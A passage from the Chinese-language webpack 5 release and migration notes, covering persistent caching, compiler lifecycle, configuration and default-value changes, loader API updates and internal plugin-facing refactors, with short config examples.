`node_modules` 中的文件，除非你用 `snapshot.managedPaths: []`以剔除该优化。\n当使用 Yarn PnP 时，webpack 假设 yarn 缓存是不可改变的（通常是这样）。\n你可以使用 `snapshot.immutablePaths: []` 来退出这个优化。\n\n缓存将默认存储在 `node_modules/.cache/webpack`（当使用 node_modules 时）或 `.yarn/.cache/webpack`（当使用 Yarn PnP 时）中。\n当所有的插件都正确处理缓存时，你可能永远都不需要手动删除它。\n\n许多内部插件也会使用持久性缓存。例如 `SourceMapDevToolPlugin` (缓存 SourceMap 的生成)或 `ProgressPlugin` (缓存模块数量)\n\n持久性缓存将根据使用情况自动创建多个缓存文件，以优化对缓存的读写访问。\n\n默认情况下，时间戳将用于开发模式的快照，而文件哈希将用于生产模式。\n文件哈希也允许在 CI 中使用持久性缓存。\n\n### 编译器闲置和关闭 \n\n编译器现在需要在使用后关闭。编译器现在会进入和离开空闲状态，并且有这些状态的钩子。插件可能会使用这些钩子来做不重要的工作。(即将持久缓存缓慢地将缓存存储到磁盘上)。在编译器关闭时--所有剩余的工作应该尽可能快地完成。一个回调标志着关闭完成。\n\n插件和它们各自的作者应该预料到，有些用户可能会忘记关闭编译器。所以，所有的工作最终也应该在空闲状态下完成。当工作正在进行时，应该防止进程退出。\n\n`webpack()` 用法在被传递回调时自动调用`close`。\n\n迁移：在使用 Node.js API 时，一定要在完成工作后调用 `Compiler.close`。\n\n### 文件生成 \n\nwebpack 过去总是在第一次构建时发出所有的输出文件，但在增量（观察）构建时跳过了写入未更改的文件。\n假设在 webpack 运行时，没有任何其他东西改变输出文件。\n\n增加了持久性缓存后，即使在重启 webpack 进程时，也应该会有类似监听的体验，但如果认为即使在 webpack 不运行时也没有其他东西改变输出目录，那这个假设就太强了。\n\n所以 webpack 现在会检查输出目录中现有的文件，并将其内容与内存中的输出文件进行比较。只有当文件被改变时，它才会写入文件。\n这只在第一次构建时进行。任何增量构建都会在运行中的 webpack 进程中生成新的资产时写入文件。\n\n我们假设 webpack 和插件只有在内容被改变时才会生成新的资产。应该使用缓存来确保在输入相同时不会生成新的资产。\n不遵循这个建议会降低性能。\n\n被标记为 `[不可变]` 的文件（包括内容哈希），当已经存在一个同名文件时，将永远不会被写入。\n我们假设当文件内容发生变化时，内容哈希会发生变化。\n这在一般情况下是正确的，但在 webpack 或插件开发过程中可能并不总是如此。\n\n## 重大变更：长期未解决的问题 \n\n### 单一文件目标的代码分割 \n\n只允许启动单个文件的目标（如 node、WebWorker、electron main）现在支持运行时自动加载引导所需的依赖代码片段。\n\n这允许对这些目标使用 `chunks: \"all\"` 和 `optimization.runtimeChunk`。\n\n请注意，如果目标的代码块加载是异步的，这使得初始评估也是异步的。当使用 `output.library` 时，这可能是一个问题，因为现在导出的值是一个 Promise。\n\n### 更新了解析器 \n\n`enhanced-resolve` 更新到了 v5，有以下改进：\n\n- 追踪更多的依赖关系，比如丢失的文件。\n- 别名可能有多种选择\n- 现在可以别名为 `false` 了。\n- 支持 `exports` 和 `imports` 字段等功能。\n- 性能提高\n\n### 没有 JS 的代码块 \n\n不包含 JS 代码的块，将不再生成 JS 文件。\n这就允许有只包含 CSS 的代码块。\n\n## 重大变更：未来计划 \n\n### 实验特性 \n\n并不是所有的功能都是一开始就稳定的。在 webpack 4 中，我们添加了实验性功能，并在变更日志中注明它们是实验性的，但从配置中并不总是能清楚地看到这些功能是实验性的。\n\n在 webpack 5 中，有一个新的 `experiments` 配置选项，允许启用实验性功能。这使得哪些功能被启用/使用变得很清楚。\n\n虽然 webpack 遵循语义版本化，但它会对实验性功能进行例外处理。实验性功能可能会在 webpack 的次要版本中包含破坏性的变化。当这种情况发生时，我们会在变更日志中添加一个明确的注释。这将使我们能够更快地迭代实验性功能，同时也使我们能够在主要版本上为稳定的功能停留更长时间。\n\n以下的实验功能将随 webpack 5 一起发布。\n\n- 旧的 WebAssembly 支持，就像 webpack 4 一样 (`experiments.syncWebAssembly`)\n- 根据[更新的规范](https://github.com/WebAssembly/esm-integration)(`experiments.asyncWebAssembly`)，新增 WebAssembly 支持。\n    - 这使得一个 WebAssembly 模块成为一个异步模块。\n- [顶层的 Await](https://github.com/tc39/proposal-top-level-await)第三阶段提案(`experiments.topLevelAwait`)\n    - 在顶层使用 `await` 使该模块成为一个异步模块。\n- 以模块的形式生成代码包 (`experiments.outputModule`)\n    - 这就从代码包中移除了包装器 IIFE，执行严格模式，通过 `<script type=\"module\">` 进行懒惰加载，并在模块模式下最小化压缩。\n\n请注意，这也意味着 WebAssembly 的支持现在被默认禁用。\n\n### 最小 Node.js 版本 \n\n最低支持的 Node.js 版本从 6 增加到 10.13.0(LTS)。\n\n迁移：升级到最新的 Node.js 版本。\n\n## 配置变更 \n\n### 结构的变化 \n\n- `entry: {}` 现在可以赋值一个空对象（允许使用插件来修改入口）。\n- `target` 支持数组，版本及 browserslist\n- 移除了 `cache: Object`：不能再设置内存缓存对象\n- 添加了 `cache.type`：现在可以在 `\"memory\"` 和 `\"filesystem\"` 间进行选择\n- 在 `cache.type = \"filesystem\"` 时，增加了新配置项：\n    - `cache.cacheDirectory`\n    - `cache.name`\n    - `cache.version`\n    - `cache.store`\n    - `cache.hashAlgorithm`\n    - `cache.idleTimeout`\n    - `cache.idleTimeoutForIntialStore`\n    - `cache.buildDependencies`\n- 添加了 `snapshot.resolveBuildDependencies`\n- 添加了 `snapshot.resolve`\n- 添加了 `snapshot.module`\n- 添加了 `snapshot.managedPaths`\n- 添加了 `snapshot.immutablePaths`\n- 添加了 `resolve.cache`：此选项可禁用/启用 safe 解析缓存\n- 移除了 `resolve.concord`\n- `resolve.alias` 值可以为数组或 `false`\n- 添加了 `resolve.restrictions`：允许限制可能存在的结果\n- 添加了 `resolve.fallback`：允许为处理不了的别名请求设置降级\n- 添加了 `resolve.preferRelative`：允许处理模块请求\n- 移除了针对于 Node.js 原生模块的自动 polyfills\n    - 移除了 `node.Buffer`\n    - 移除了 `node.console`\n    - 移除了 `node.process`\n    - 移除了 `node.*`（Node.js 原生模块）\n    - 迁移：`resolve.alias` 和 `ProvidePlugin`。错误会给出提示。（可以参考 [node-libs-browser](https://github.com/webpack/node-libs-browser)，了解 v4 中 polyfill 和 mock 的方式）\n- `output.filename` 可以设置为函数\n- 添加了 `output.assetModuleFilename`\n- `output.jsonpScriptType` 更名为 `output.scriptType`\n- `devtool` 更加严格\n    - 格式化：`false | eval | [inline-|hidden-|eval-][nosources-][cheap-[module-]]source-map`\n- 添加了 `optimization.chunkIds: \"deterministic\"`\n- 添加了 `optimization.moduleIds: \"deterministic\"`\n- `optimization.moduleIds: \"hashed\"` 已弃用\n- 移除了 `optimization.moduleIds: \"total-size\"`\n- 废弃了模块的 flag 并移除了 chunk id\n    - 移除了 `optimization.hashedModuleIds`\n    - 移除了 `optimization.namedChunks` (`NamedChunksPlugin` too)\n    - 移除了 `optimization.namedModules` (`NamedModulesPlugin` too)\n    - 移除了 `optimization.occurrenceOrder`\n    - 迁移：使用 `chunkIds` 和 `moduleIds`\n- `optimization.splitChunks` `test` 不再匹配 chunk 名\n    - 迁移：使用 test 函数\n    `(module, { chunkGraph }) => chunkGraph.getModuleChunks(module).some(chunk => chunk.name === \"name\")`\n- 添加了 `optimization.splitChunks` `minRemainingSize`\n- `optimization.splitChunks` 的 `filename` 可以设置为函数\n- `optimization.splitChunks` 的大小现在可以设置为每个源类型大小的对象\n    - `minSize`\n    - `minRemainingSize`\n    - `maxSize`\n    - `maxAsyncSize`\n    - `maxInitialSize`\n- `optimization.splitChunks` 中的 `maxAsyncSize` 和 `maxInitialSize` 添加了 `maxSize`：允许为初始和异步 chunk 指定不同的 maxSize\n- 移除了 `optimization.splitChunks` 的 `name: true`：不再支持自动命名\n    - 迁移：使用默认值。`chunkIds: \"named\"` 会为你的文件取一个有用的名字，以便于调试\n- 添加了 `optimization.splitChunks.cacheGroups[].idHint`：会给出提示，如果选择命名的 chunk id\n- 移除了 `optimization.splitChunks` 的 `automaticNamePrefix`\n    - 迁移：使用 `idHint` 代替\n- `optimization.splitChunks` 的 `filename` 不再局限于初始 chunk\n- 添加了 `optimization.splitChunks` 的 `usedExports`，以便在比较模块时引入使用过的 export\n- 添加了 `optimization.splitChunks.defaultSizeTypes`：当使用数字表示 size 时，可以指定 size 的类型\n- 添加了 `optimization.mangleExports`\n- `optimization.minimizer` `\"...\"` 可以用于引入默认值\n- `optimization.usedExports` `\"global\"` 增加了一个值，以允许在每个运行时中禁用分析，而在全局范围内进行分享（性能更好）\n- `optimization.noEmitOnErrors` 更名为 `optimization.emitOnErrors`，逻辑颠倒\n- 添加了 `optimization.realContentHash`\n- 移除了 `output.devtoolLineToLine`\n    - 迁移：没有替代项\n- 现已允许 `output.chunkFilename: Function`\n- `output.hotUpdateChunkFilename: Function` 已被禁止：反正也没什么用。\n- `output.hotUpdateMainFilename: Function` 已被禁止：反正也没什么用。\n- `output.importFunctionName: string` 指定用于替换 `import()` 的名称，以允许在不支持的环境中进行 polyfilling\n- 添加了 `output.charset`：将其设置为 false，会省略 script 标签上的 `charset` 属性\n- `output.hotUpdateFunction` 更名为 `output.hotUpdateGlobal`\n- `output.jsonpFunction` 更名为 `output.chunkLoadingGlobal`\n- `output.chunkCallbackFunction` 更名为 `output.chunkLoadingGlobal`\n- 添加了 `output.chunkLoading`\n- 添加了 `output.enabledChunkLoadingTypes`\n- 添加了 `output.chunkFormat`\n- `module.rules` 中的 `resolve` 和 `parser` 将以不同的方式进行合并（对象会进行深度合并，数组可能会使用 `\"...\"` 的形式来引用之前的值）\n- 添加了 `module.rules` `parser.worker`：允许为支持的 worker 添加配置\n- `module.rules` 中的 `query` 和 `loaders` 被移除\n- 向 `module.rules` 中的 `options` 传递字符串的形式被废弃\n    - 迁移：使用传递选项对象的方式代替，当不支持这种方式时，请在对应的 loader 中开启一个 issues\n- 添加了 `module.rules` `mimetype`：允许匹配 DataURI 的 mimetype\n- 添加了 `module.rules` `descriptionData`：允许匹配来自 package.json 中的数据\n- `module.defaultRules` `\"...\"` 可以用于引用默认值\n- 添加了 `stats.chunkRootModules`：用于显示根模块的 chunk\n- 添加了 `stats.orphanModules`：用于显示为 emit 的模块\n- 添加了 `stats.runtime`：用于显示 runtime 模块\n- 添加了 `stats.chunkRelations`：用于显示 parent/children/sibling 的 chunk\n- 添加了 `stats.errorStack`：用于显示追踪 webpack 内部的堆栈错误\n- 添加了 `stats.preset`：选择 preset\n- 添加了 `stats.relatedAssets`：用于显示与其他 asset 相关的 asset（如，SourceMaps）\n- `stats.warningsFilter` 已被弃用，请改用 `ignoreWarnings`\n- `BannerPlugin.banner` 签名已变更\n    - 移除了 `data.basename`\n    - 移除了 `data.query`\n    - 迁移：从 `filename` 中获取\n- 移除了 `SourceMapDevToolPlugin` 的 `lineToLine`\n    - 迁移：无可替代项\n- `[hash]` 作为完整的编译 hash 值，现已被弃用\n    - 迁移：使用 `[fullhash]` 代替，或最好选用其他 hash 选项\n- `[modulehash]` 已被弃用\n    - 迁移：使用 `[hash]` 代替\n- `[moduleid]` 已被弃用\n    - 迁移：使用 `[id]` 代替\n- 移除了 `[filebase]`\n    - 迁移：使用 `[base]` 代替\n- 基于文件模板的新 placeholders（例如 SourceMapDevToolPlugin）\n    - `[name]`\n    - `[base]`\n    - `[path]`\n    - `[ext]`\n- 当给 `externals` 传递一个函数时，现在有一个不同的签名 `({ context, request }, callback)`\n    - 迁移：改变函数签名\n- 添加了 `externalsPresets`\n- 添加了 `experiments`（见上述实验部分）\n- 添加了 `watchOptions.followSymlinks`\n- `watchOptions.ignored` 可以使用正则匹配\n- 暴露了 `webpack.util.serialization`\n\n### 默认值变更 \n\n- 当 browserslist 配置可用时，`target` 默认为 `\"browserslist\"`\n- `module.unsafeCache` 现默认只对 `node_modules` 启用\n- `optimization.moduleIds` 在生产环境下默认为 `deterministic`，而不再是 `size`\n- `optimization.chunkIds` 在生产环境下默认为 `deterministic`，而不再是 `total-size`\n- `optimization.nodeEnv` 在 `none` 模式下，默认为 `false`\n- `optimization.splitChunks.minSize` 在生产环境下默认为 `20k`\n- `optimization.splitChunks.enforceSizeThreshold` 在生产环境下默认为 `50k`\n- `optimization.splitChunks` 中的 `minRemainingSize` 在生产环境下默认为 `minSize`\n    - 这将导致在剩余部分过小的情况下，创建更少的 chunk\n- `optimization.splitChunks` 中的 `maxAsyncRequests` 和 `maxInitialRequests` 默认值增加到了 30\n- `optimization.splitChunks.cacheGroups.vendors` 更名为 `optimization.splitChunks.cacheGroups.defaultVendors`\n- `optimization.splitChunks.cacheGroups.defaultVendors.reuseExistingChunk` 默认为 `true`\n- `optimization.minimizer` 的 target 默认在 terser 选项中使用 `compress.passes: 2`\n- 当使用 `cache` 时， `resolve(Loader).cache` 默认为 `true`\n- `resolve(Loader).cacheWithContext` 默认为 `false`\n- `resolveLoader.extensions` 移除了 `.json`\n- `node.global` 中的 `node.__filename` 和 `node.__dirname` 默认为 `false`\n- `stats.errorStack` 默认为 `false`\n\n## 加载器相关变更 \n\n### `this.getOptions` \n\n这个新的 API 应该可以简化加载器中选项的使用。\n它允许传递 JSON 模式进行验证。\n详情请见[PR](https://github.com/webpack/webpack/pull/10017)\n\n### `this.exec` \n\n这一点已从加载器上下文中删除\n\n迁移：这可以在加载器本身实现。\n\n### `this.getResolve` \n\nloader API 中的 `getResolve(options)` 将以另一种方式合并选项，参见` module.rule``resolve `。\n\n由于 webpack 5 在不同的发布依赖关系之间存在差异，所以传递一个 `dependencyType` 作为选项可能是有意义的（例如`\"esm\"`，`\"commonjs\"`，或者其他）。\n\n## 重大内部变更 \n\n?> 这一部分可能需要更多的完善。\n\n以下改动只与插件作者有关：\n\n### 新的插件运行顺序 \n\n现在 webpack 5 中的插件在应用配置默认值 **之前** 就会被应用。\n这使得插件可以应用自己的默认值，或者作为配置预设。\n\n但这也是一个突破性的变化，因为插件在应用时不能依赖配置值的设置。\n\n迁移：只在插件钩子中访问配置。或者最好完全避免访问配置，并通过构造函数获取选项。\n\n### 运行时模块 \n\n大部分的运行时代码被移到了所谓的\"运行时模块\"中。这些特殊模块负责添加运行时代码。它们可以被添加到任何块中，但目前总是被添加到运行时块中。\"运行时需求\"控制哪些运行时模块（或核心运行时部件）被添加到代码包中。这确保了只有使用的运行时代码才会被添加到代码包中。未来，运行时模块也可以添加到按需加载的块中，以便在需要时加载运行时代码。\n\n在大多数情况下，核心运行代码时允许内联入口模块，而不是用 `__webpack_require__` 来调用它。如果代码包中没有其他模块，则根本不需要使用 `__webpack_require__`。这与模块合并很好地结合在一起，即多个模块被合并成一个模块。\n\n在最好的情况下，根本不需要运行时代码。\n\n迁移：如果你在插件中注入运行时代码到 webpack 运行时，可以考虑使用 RuntimeModules 来代替。instead.\n\n### 序列化 \n\n我们添加了一个序列化机制，以允许在 webpack 中对复杂对象进行序列化。它有一个可选的语义，所以那些应该被序列化的类需要被明确地标记出来（并且实现它们的序列化）。大多数模块、所有的依赖关系和一些错误都已经这样做了。\n\n迁移：当使用自定义模块或依赖关系时，建议将它们实现成可序列化的，以便从持久化缓存中获益。\n\n### 用于缓存的插件 \n\n增加了一个带有插件接口的 `Cache` 类。该类可用于写入和读取缓存。根据配置的不同，不同的插件可以为缓存添加功能。`MemoryCachePlugin` 增加了内存缓存功能。`FileCachePlugin` 增加了持久性（文件系统）缓存。\n\n`FileCachePlugin` 使用序列化机制将缓存项目持久化到磁盘上或从磁盘上恢复。\n\n### 冻结钩子对象 \n\n有 `hooks` 的类会冻结其 `hooks` 对象，所以通过这种方式添加自定义钩子已经不可能了。\n\n迁移：推荐的添加自定义钩子的方式是使用 WeakMap 和一个静态的 `getXXXHooks(XXX)`(即`getCompilationHook(compilation)`)方法。内部类使用与自定义钩子相同的机制。\n\n### Tapable 插件升级 \n\nwebpack 3 插件的 compat 层已经被移除。它在 webpack 4 中已经被取消了。\n\n一些较少使用的 tapable API 被删除或废弃。\n\n迁移：使用新的 tapable API。\n\n### Stage 钩子 \n\n在封装代码包过程的几个步骤中，不同阶段有多个钩子，即 `optimizeDependenciesBasic`, `optimizeDependencies` 和 `optimizeDependenciesAdvanced`。这些已经被删除，改为一个单一的钩子，它可以与 `stage` 选项一起使用。参见 `OptimizationStages`了解可能的 `stage` 选项值。\n\nMIGRATION: 侵入剩余的钩子。你可以添加一个 `stage` 选项。\n\n### Main/Chunk/ModuleTemplate 废弃 \n\n打包模板已经重构。MainTemplate/ChunkTemplate/ModuleTemplate 被废弃，现在 JavascriptModulesPlugin 负责 JS 模板。\n\n在那次重构之前，JS 输出由 Main/ChunkTemplate 处理，而另一个输出（即 WASM、CSS）则由插件处理。这样看起来 JS 是一等公民，而其它输出是二等。重构改变了这一点，所有的输出都由他们的插件处理。\n\n依然可以侵入部分模板。钩子现在在 JavascriptModulesPlugin 中，而不是 Main/ChunkTemplate 中。(是的，插件也可以有钩子，我称之为附加钩子。)\n\n有一个兼容层，所以 Main/Chunk/ModuleTemplate 仍然存在，但只是将 tap 调用委托给新的钩子位置。\n\n迁移：按照 deprecation 消息中的建议。主要是指向不同位置的钩子。\n\n### 入口文件描述符 \n\n如果传递一个对象作为入口文件，其值可能是一个字符串、字符串数组或描述符：\n\n```js\nmodule.exports = {\n  entry: {\n    catalog: {\n      import: './catalog.js',\n    },\n  },\n};\n```\n\n描述符语法可用于向入口文件传递附加选项。\n\n#### 入口文件输出文件名 \n\n默认情况下，入口文件代码块的输出文件名是从`output.filename`中提取的，\n但你可以为特定入口文件指定一个自定义的输出文件名：\n\n```js\nmodule.exports = {\n  entry: {\n    about: { import: './about.js', filename: 'pages/[name][ext]' },\n  },\n};\n```\n\n#### 入口文件依赖 \n\n默认情况下，每个入口文件代码块都存储了它所使用的所有模块。使用 `dependOn`-选项，\n你可以将模块从一个入口文件代码块共享到另一个：\n\n```js\nmodule.exports = {\n  entry: {\n    app: { import: './app.js', dependOn: 'react-vendors' },\n    'react-vendors': ['react', 'react-dom', 'prop-types'],\n  },\n};\n```\n\napp 代码块 将不包含 `react-vendors` 所拥有的模块。\n\n#### 入口文件类库 \n\n入口文件描述符允许为每个入口文件传递不同的 `library` 选项。\n\n```js\nmodule.exports = {\n  entry: {\n    commonjs: {\n      import: './lib.js',\n      library: {\n        type: 'commonjs-module',\n      },\n    },\n    amd: {\n      import: './lib.js',\n      library: {\n        type: 'amd',\n      },\n    },\n  },\n};\n```\n\n#### 入口文件运行时 \n\n入口文件描述符允许为每个入口文件指定一个 `运行时代码`。\n当指定时，将创建一个以该名称命名的代码块，其中仅包含该条目的运行时代码。\n当多个条目指定相同的`运行时代码`时，该块将包含所有这些入口文件的共同运行时代码。\n这意味着它们可以在同一个 HTML 页面中一起使用。\n\n```js\nmodule.exports = {\n  entry: {\n    app: {\n      import: './app.js',\n      runtime: 'app-runtime',\n    },\n  },\n};\n```\n\n#### 入口文件代码块加载 \n\n入口文件描述符允许为每个入口文件指定一个 `chunkLoading`。\n这个入口文件的运行时代码将使用这个来加载代码块。\n\n```js\nmodule.exports = {\n  entry: {\n    app: {\n      import: './app.js',\n    },\n    worker: {\n      import: './worker.js',\n      chunkLoading: 'importScripts',\n    },\n  },\n};\n```\n\n### 排序与 ID \n\nwebpack 曾经在编译阶段以特定的方式对模块和代码块进行排序，以递增的方式分配 ID。现在不再是这样了。顺序将不再用于 ID 的生成，取而代之的是，ID 生成的完全控制在插件中。\n\n优化模块和代码块顺序的钩子已经被移除。\n\n迁移：在编译阶段，你不能再依赖模块和代码块的顺序了。\n\n### 从数组到集合(Set) \n\n- Compilation.modules 现在是一个集合\n- Compilation.chunks 现在是一个集合\n- Chunk.files 现在是一个集合\n\n存在一个适配层但会打印废弃的警告。\n\n迁移: 使用集合方法代替数组方法。\n\n### Compilation.fileSystemInfo \n\n这个新 class 可以用来以缓存的方式访问文件系统的信息。目前，它允许访问文件和目录的时间戳。如果可能的话，关于时间戳的信息会从监听那里传输过了，否则将由文件系统访问决定。\n\n后续，会增加访问文件内容 hash 值的功能，模块可以用文件内容代替文件 hash 来检查有效性。\n\n迁移：使用 `compilation.fileSystemInfo` API，替代 `file/contextTimestamps`。\n\n现在可以对目录进行时间戳管理，允许对 ContextModules 进行序列化。\n\n增加了 `Compiler.modifiedFiles`（类似于 `Compiler.removedFiles`），以便更容易引用更改后的文件。\n\n### Filesystems \n\n新增了一个类似于 `compiler.inputFileSystem` 和 `compiler.outputFileSystem` 的新 API `compiler.intermediateFileSystem`，用于所有不被认为是输入或输出的 fs 操作，如写入 records，缓存或输出 profiling。\n\n文件系统现在有 `fs` 接口，不再需要 `join` 或 `mkdirp` 等额外方式。但如果它们包含 `join` 或 `dirname` 等类似方法，也会被使用。\n\n### 模块热替换 \n\nHMR 运行时已被重构为运行时模块。`HotUpdateChunkTemplate` 已被合并入 `ChunkTemplate` 中。ChunkTemplates 和 plugins 也应处理 `HotUpdateChunk` 了。\n\nHMR 运行时的 javascript 部分已从核心 HMR 运行时钟分离了出来。其他模块类型现在也可以使用它们自己的方式处理 HMR。在未来，这将使得 HMR 处理诸如 mini-css-extract-plugin 或 WASM 模块。\n\n迁移：此为新功能，无需迁移。\n\n`import.meta.webpackHot` 公开了与 `module.hot` 相同的 API。当然可以在 ESM 模块（.mjs，package.json 中的 type: \"module\"）中使用，这些模块不能访问 `module`。\n\n### 工作队列 \n\nwebpack 曾经通过函数调用函数的形式来进行模块处理，还有一个 `semaphore` 选项限制并行性。`Compilation.semaphore` 已被移除，现在可以使用异步队列处理，每个步骤都有独立的队列：\n\n- `Compilation.factorizeQueue`：为一组 dependencies 调用模块工厂。\n- `Compilation.addModuleQueue`：将模块添加到编译队列中（可以使用缓存恢复模块）\n- `Compilation.buildQueue`：必要时构建模块（可将模块存储到缓存中）\n- `Compilation.rebuildQueue`：如需手动触发，则会重新构建模块\n- `Compilation.processDependenciesQueue`：处理模块的 dependencies。\n\n这些队列会有一些 hook 来监听并拦截工作的进程。\n\n未来，多个编译器会同时工作，可以通过拦截这些队列来进行编译工作的编排。\n\n迁移：此为新功能，无需迁移。\n\n### Logging \n\nwebpack 内部引入了一些日志记录的方法。\n`stats.logging` 和 `infrastructureLogging` 选项可用于启用这些信息。\n\n### 模块和 chunk 图 \n\nwebpack 曾经在依赖关系中存储了已解析的模块，并在 chunk 中存储引入的模块。但现已发生变化。所有关于模块在模块图中如何连接的信息，现在都存储在 ModulGraph 的 class 中。所有关于模块与 chunk 如何连接的信息现在都已存储在 ChunkGraph 的 class 中。依赖于 chunk 图的信息也存储在相关的 class 中。\n\n这意味着以下关于模块的信息已被移动：\n\n- Module connections -> ModuleGraph\n- Module issuer -> ModuleGraph\n- Module optimization bailout -> ModuleGraph (TODO: check if it should ChunkGraph instead)\n- Module usedExports -> ModuleGraph\n- Module providedExports -> ModuleGraph\n- Module pre order index -> ModuleGraph\n- Module post order index -> ModuleGraph\n- Module depth -> ModuleGraph\n- Module profile -> ModuleGraph\n- Module id -> ChunkGraph\n- Module hash -> ChunkGraph\n- Module runtime requirements -> ChunkGraph\n- Module is in chunk -> ChunkGraph\n- Module is entry in chunk -> ChunkGraph\n- Module is runtime module in chunk -> ChunkGraph\n- Chunk runtime requirements -> ChunkGraph\n\n当从缓存中恢复模块时，webpack 会将模块从图中断开。现在已无需这么做。一个模块不存储图形的任何信息，技术上可以在多个图形中使用。这会使得缓存变得更加容易。\n\n这部分变化中大多数都有一个 compat-layer，当使用时，它会打印一个弃用警告。\n\n迁移：在 ModuleGraph 和 ChunkGraph 上使用新的 API。\n\n### Init Fragments \n\n`DependenciesBlockVariables` 已被移除，改为 `InitFragments`。`DependencyTemplates` 现在可以添加 `InitFragments`，以将代码注入模块源的起始位置。`InitFragments` 允许删除重复数据。\n\n迁移：使用 `InitFragments` 代替，而无需在源文件的负索引出插入。\n\n### 模块 Source Types \n\nModules 现在必须通过 `Module.getSourceTypes()` 来定义它们支持的源码类型。根据这一点，不同的插件会用这些类型调用 `source()`。对于源类型为 `javascript` 的 `JavascriptModulesPlugin` 会将源代码嵌入到 bundle 中。源类型 `webassembly` 的 `WebAssemblyModulesPlugin` 会 emit 一个 wasm 文件。同时，也支持自定义源类型，例如，mini-css-extract-plugin 会使用源类型为 `stylesheet` 将源码嵌入到 css 文件中。\n\n模块类型与源类型间没有关系。即使模块类型为 `json`，也可以使用源类型为 `javascript` 和模块类型为 `webassembly/experimental` 的 `javascript` 和 `webassembly`。\n\n迁移：自定义模块需要实现这些新的接口方法。\n\n### Stats 的插件 \n\nStats 的 `preset`，`default`，`json` 和 `toString` 现已由插件系统内置。将当前的 Stats 转换为插件。\n\n迁移：你现在可以自定义它，而无需替换整个 Stats 功能。额外的信息现在可以添加到 stats json 中，而不是单独编写文件。\n\n### 全新的监听 \n\nwebpack 所使用的监听已重构。它之前使用的是 `chokidar` 和原生依赖 `fsevents`（仅在 OSX 上）。现在它在只基于原生的 Node.js 中的 `fs`。这意味着在 webpack 中已经没有原生依赖了。\n\n它还能在监听时捕捉更多关于文件系统的信息。目前，它还可以捕获 mtimes 和监视事件时间，以及丢失文件的信息。为此，`WatchFileSystem` API 做了一点小改动。在修改的同时，我们还将 Arrays 转换为 Sets，Objects 转换为 Maps。\n\n### SizeOnlySource after emit \n\nwebpack 现在使用 `SizeOnlySource` 替换 `Compilation.assets` 中的 Sources，以减少内存占用。\n\n### Emitting assets multiple times \n\n原来的 `Multiple assets emit different content to the same filename` 警告，现在成为错误。\n\n### ExportsInfo \n\n重构了模块导出信息的存储方式。ModuleGraph 现在为每个 `Module` 提供了一个 `ExportsInfo`，它用于存储每个 export 的信息。如果模块仅以副作用的方式使用，它还存储了关于未知 export 的信息，\n\n对于每个 export，都会存储以下信息：\n\n- 是否使用 export? 是否使用并不确定。（详见 `optimization.usedExports`）\n- 是否提供 export? 是否提供并不确定。（详见 `optimization.providedExports`）\n- 能否重命名 export 名? 是否重命名，也不确定\n- 如果 export 已重新命名，则为新名称。（详见 `optimization.mangleExports`）\n- 嵌套的 ExportsInfo，如果 export 是一个含有附加信息的对象，那么它本身就是一个对象\n    - 用于重新导出命名空间对象：`import * as X from \"...\"; export { X };`\n    - 用于表示 JSON 模块中的结构\n\n### 代码生成阶段 \n\n编译的代码生成功能作为单独的编译阶段。它不再隐藏在 `Module.source()` 和 `Module.getRuntimeRequirements()` 中运行了。\n\n这应该会使得流程更加简洁。它还运行报告该阶段的进度。并使得代码生成在剖析时更加清晰可见。\n\n迁移：`Module.source()` 和 `Module.getRuntimeRequirements()` 已弃用。使用 `Module.codeGeneration()` 代替。\n\n### 依赖关系参考 \n\nwebpack 曾经有一个单一的方法和类型来表示依赖关系的引用（`Compilation.getDependencyReference` 会返回一个 `DependencyReference`）\n该类型用于引入关于该引用的所有信息，如 被引用的模块，已经引入了哪些 export，如果是弱引用，还需要订阅一些相关信息。\n\n把所有这些信息构建在一起，拿到参考的成本就很高，而且很频繁（每次有人需要一个信息）。\n\n在 webpack5 中，这部分代码库被重构了，方法进行了拆分。\n\n- 引用的模块可以从 ModuleGraphConnection 中读取\n- 引入的导出名，可以通过 `Dependency.getReferencedExports()` 获取\n- `Dependency` 的 class 上会有一个 `weak` 的 flag\n- 排序只与 `HarmonyImportDependencies` 相关，可以通过 `sourceOrder` 属性获取\n\n### Presentational Dependencies \n\n这是 `NormalModules` 的一种新 Dependencies 类型：Presentational Dependencies\n\n这些 dependencies 只在代码生成阶段使用，但在模块图构建过程中未使用。\n所以它们永远不能引用模块或影响导出/导入。\n\n这些依赖关系的处理成本较低，webpack 会尽可能地使用它们\n\n### 弃用 loaders \n\n- [`null-loader`](https://github.com/webpack-contrib/null-loader)\n\n  已被弃用。使用\n\n  ```js\n  module.exports = {\n    resolve: {\n      alias: {\n        xyz$: false,\n      },\n    },\n  };\n  ```\n\n  或者使用绝对路径\n\n  ```js\n  module.exports = {\n    resolve: {\n      alias: {\n        [path.resolve(__dirname, '....')]: false,\n      },\n    },\n  };\n  ```\n\n## 微小改动 \n\n- `Compiler.name`：当生成带有绝对路径的编译器名称时，请确保名称使用 `|` 或 `!` 分隔。\n    - 使用空格作为分隔符的做法现已不再适用。（路径可以保护空格）\n    - 温馨提示：在 Stats 中输出时 `|` 会被替换为空格。\n- `SystemPlugin` 现已被默认禁用。\n    - 迁移：应避免使用它，因为此规范已被删除。你可以使用 `Rule.parser.system: true` 来重新启用它。\n- `ModuleConcatenationPlugin`：`DependencyVariables` 已被移除，将不再阻止连接。\n    - 这意味着它现在可以在 `module`，`global`，`process` 或 ProvidePlugin 的情况下进行连接。\n- 移除了 `Stats.presetToOptions`\n    - 迁移：使用 `compilation.createStatsOptions` 代替\n- 移除了 `SingleEntryPlugin` 和 `SingleEntryDependency`\n    - 迁移：使用 `EntryPlugin` 和 `EntryDependency` 代替\n- chunk 现在可以有多个入口\n- 移除了 `ExtendedAPIPlugin`\n    - 迁移：不再需要此插件，在必要时，你可以使用 `__webpack_hash__` 和 `__webpack_chunkname__` 注入运行时代码。\n- `ProgressPlugin` 不再为 `reportProgress` 使用 tapable 上下文。\n    - 迁移：使用 `ProgressPlugin.getReporter(compiler)` 代替\n- 现已对 `.mjs` 文件重新启用 `ProvidePlugin`\n- `Stats` json 中的 `errors` 和 `warnings` 不再是字符串类型，而是包含必要信息的对象，这些信息会被分割为熟悉。\n    - 迁移：查阅具体属性信息，如 `message` 字段\n- 移除了 `Compilation.hooks.normalModuleLoader`\n    - 迁移：使用 `NormalModule.getCompilationHooks(compilation).loader` 代替\n- 将 `NormalModuleFactory` 中的 hook 从 waterfall 改为 bailing，修改并对 waterfall 函数的 hook 进行了重命名操作。\n- 移除了 `compilationParams.compilationDependencies`\n    - 插件可以在编译中使用 `compilation.file/context/missingDependencies` 添加依赖关系\n    - Compat 层将 `compilationDependencies.add` 委托给 